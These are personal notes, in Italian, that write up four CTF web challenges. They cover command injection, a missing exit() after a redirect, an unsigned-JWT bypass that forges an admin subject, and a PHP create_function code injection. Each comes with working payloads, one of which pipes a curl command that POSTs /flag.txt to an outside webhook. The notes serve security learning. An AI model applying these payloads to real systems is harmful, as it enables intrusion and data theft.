
## Basic RCE:

==link== = “[http://basicrce.challs.cyberchallenge.it/](http://basicrce.challs.cyberchallenge.it/)”

==solve:==
inviare una richiesta POST contenente la flag a un webhook.

==note:==
[[Special Characters and Regex in Shell Commands#Regex|Regex]]
${IFS} - (sostitutivo di spazio per bash)
$(bash cmd) - (command sostitution)
[[Shell Commands|Shell Commands]]
awk - per comporre le stringhe

==payload:==
```bash
www.google.com|curl${IFS}-d${IFS}"idx=$(cat${IFS}/flag.txt)"${IFS}-X${IFS}POST${IFS}<webhook link>
```
------
## Admin:Admin

==link== = "http://adminadmin.challs.cyberchallenge.it/admin.php"

==solve:==
nello script PHP della pagina admin.php possiamo vedere che dopo il controllo dell'autenticazione della sessione viene settato `header(Location:login.php)`, tuttavia manca un `exit()` o un `die()` per terminare i dati nella risposta.
Dunque si ottiene un redirect con un body.

Curl ottiene l'header ma non fa il redirect, legge la singola risposta ricevuta.

==payload:==
```bash
curl -v -X GET http://adminadmin.challs.cyberchallenge.it/admin.php
```
---
## LINECTF2024 | jalyboy-baby

==link== = "http://34.84.28.50:10000/"

==solve==:
La challenge utilizza un sistema di firma digitale(JWT)
che e' formato da una stringa, inviata tramite un parametro j, costruita in questo modo:
`<algoritmo>b64.<subject>b64.firma-calcolata`

dove:
- algoritmo -> {"alg":"HS256"}
- subject -> {"sub":"guest"}
- firma -> sha256(algoritmo(b64)+subject(b64)+secret-key)

nello script back-end si puo' notare che si utilizza una funzione deprecata:
```java
Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
```

e guardando nella documentazione troviamo che `setSigningKey`:
*`If the specified JWT string is not a JWS (no signature), this key is not used.`*

Dunque la soluzione e' quella di non fornire una firma e sostituire il parametro `sub` da `{"sub":"guest"}` a `{"sub":"admin"}` e poi convertirlo in base 64 -> `eyJzdWIiOiJhZG1pbiJ9`

==payload:==
`<URL>/j=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.<null>`

---
# PHP is Love PHP is Life

==link== = http://phpislove.challs.cyberchallenge.it/

solve:
facendo alcuni tentativi e guardando il source code e' possibile notare che lo **user input** viene preso nella variabile `$code` e compare due volte. Nella prima viene controllata e sanitizzata con la funzione `preg_match()` che non e' exploitabile in questo caso.

Tuttavia successivamente viene usata una funzione **deprecata** di PHP chiamata `create_function(<params>,<function-code>)` che effettua un `eval()` del codice inserito e lo esegue come codice in una funzione anonima.

Si puo' notare inoltre che un commento impedisce la visualizzazione della funzione creata percio' se la funzione che componiamo va a buon fine otterremo la risposta di default ovvero: `This function is disabled.` Se invece non si visualizza alcun output significa che c'e' stato un problema di compilazione nella funzione anonima costruita.

da qui l'unico modo per ricevere un output e' con un payload che permetta di uscire dallo scope della funzione anonima ed eseguire codice normale ricordandosi pero' della blacklist.

==payload:==
```php
return 0;}; print 1;//
```
in questo caso chiudiamo la funzione anonima con un return 0 e una parentesi } per poi scrivere altro codice fuori da essa come ad esempio `print 1;` che e' una funzione deprecata con la stessa finalita' di `echo`.

una volta visualizzato l'output grazie a questo payload bisogna capire come visualizzare il contenuto della variabile `$flag`. 

Questo si puo' fare in diversi modi, quello che ho usato e' stato prendere la stringa "flag" dall'array di stringhe blacklisted in modo da utilizzarla per chiamare la variabile con la simbologia `${$var}`.

Tuttavia la blacklist impedisce l'uso di parentesi `[]` e dunque non si puo' selezionare un elemento `n` dall'array.

Pero' con ricerche sulla documentazione e' possibile notare un dettaglio fondamentale che dichiara la possibilita' di specificare indici di array con `{}` nelle versioni di PHP precedenti alla `8.0.0`
![[Pasted image 20240325021733.png]]

dunque, avendo il seguente array: `$strings = ['eval', 'include', 'require', 'function', 'flag', 'echo'];`

era possibile costruire un payload di questo tipo:
```php
return 0;}; print ${$strings{4}};//
```
---
